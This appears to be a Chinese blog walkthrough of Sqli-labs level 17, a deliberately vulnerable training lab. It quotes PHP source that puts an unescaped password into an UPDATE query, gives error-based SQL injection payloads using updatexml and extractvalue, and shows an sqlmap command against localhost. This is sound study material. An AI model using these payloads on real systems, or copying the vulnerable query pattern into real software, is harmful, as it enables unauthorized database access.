---
 title: Sqlilabs通关笔记(17)UPDATE更新注入
 date: 2020-01-07 10:49:29
 tags: SQL注入
 categories: SQL注入
---

## 第十七关 基于POST错误的更新
![2020-1-7-11-11-19](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-7-11-11-19)

### 注入点判断
<!--more-->
1. 在passwd直接加反斜杠有报错 
> uname=admin&passwd=admin\&submit=Submit
2. 可以在passwd参数上尝试报错注入
3. 界面输入框好像是更新密码的窗口，猜测是对用户输入的密码没有进行检测过滤

### 源码分析

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);

function check_input($value)
	{
	if(!empty($value))
		{
		// truncation (see comments)截断15位
		$value = substr($value,0,15);
		}

		// Stripslashes if magic quotes enabled 如果打开了魔法开关，会自动转义
		if (get_magic_quotes_gpc())
			{
                // 将反斜杠去掉
			$value = stripslashes($value);
			}

		// Quote if not a number
		if (!ctype_digit($value))
			{
                // 自动转义
			$value = "'" . mysql_real_escape_string($value) . "'";
			}
		
	else
		{
		$value = intval($value);
		}
	return $value;
	}

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))

{
//making sure uname is not injectable
$uname=check_input($_POST['uname']);  

$passwd=$_POST['passwd'];


//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'User Name:'.$uname."\n");
fwrite($fp,'New Password:'.$passwd."\n");
fclose($fp);


// connectivity 
@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";

$result=mysql_query($sql);
$row = mysql_fetch_array($result);
//echo $row;
	if($row)
	{
  		//echo '<font color= "#0000ff">';	
		$row1 = $row['username'];  	
		//echo 'Your Login name:'. $row1;
		$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
		mysql_query($update);
  		echo "<br>";
	
	
	
		if (mysql_error())
		{
			echo '<font color= "#FFFF00" font size = 3 >';
			print_r(mysql_error());
			echo "</br></br>";
			echo "</font>";
		}
		else
		{
			echo '<font color= "#FFFF00" font size = 3 >';
			//echo " You password has been successfully updated " ;		
			echo "<br>";
			echo "</font>";
		}
	
		echo '<img src="../images/flag1.jpg"   />';	
		//echo 'Your Password:' .$row['password'];
  		echo "</font>";
	


  	}
	else  
	{
		echo '<font size="4.5" color="#FFFF00">';
		//echo "Bug off you Silly Dumb hacker";
		echo "</br>";
		echo '<img src="../images/slap1.jpg"   />';
	
		echo "</font>";  
	}
}

?>
```

1. 查看源码可知有个过滤函数check_input，其过滤步骤是
    - substr($value,0,15) 截断到15位
    - 单引号、双引号、反斜杠、null自动用反斜杠转义
    - stripslashes()去掉多余的反斜杠

2. 源码看passwd并没有使用过滤函数过滤,因而可以进行变量可控
> $passwd=$_POST['passwd'];

3. 是通过update进行一个拼接，且会打印错误信息

> $update="UPDATE users SET password = '$passwd' WHERE username='$row1'";

4. 报错注入无疑了，直接上payload

> uname=admin&passwd=' and (updatexml(1,concat(0x7e,(select user()),0x7e),1))#&submit=Submit

> uname=admin&passwd=' and extractvalue(null,concat(0x7e,database(),0x7e))#&submit=Submit


### SQLMAP注入

> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-17/" --data "uname=admin&passwd=woshiadmin&submit=Submit" -p passwd --dbms mysql --threads 10 --method POST --flush-session --fresh-queries --level 1 --risk 1 --technique E --dbs

* **--data:指定请求信息**

* **-p:指定参数**

* **--dbms:指定后端数据库**

* **--threads:指定并发线程数**

* **--method:指定请求方式**

* **--flush-session:清除session**

* **--fresh-queries:发起新的请求**

* **--level 1:尝试POST和GET注入**

* **--risk 1:仅测试常见用例**

* **--technique E:仅测试报错注入方式**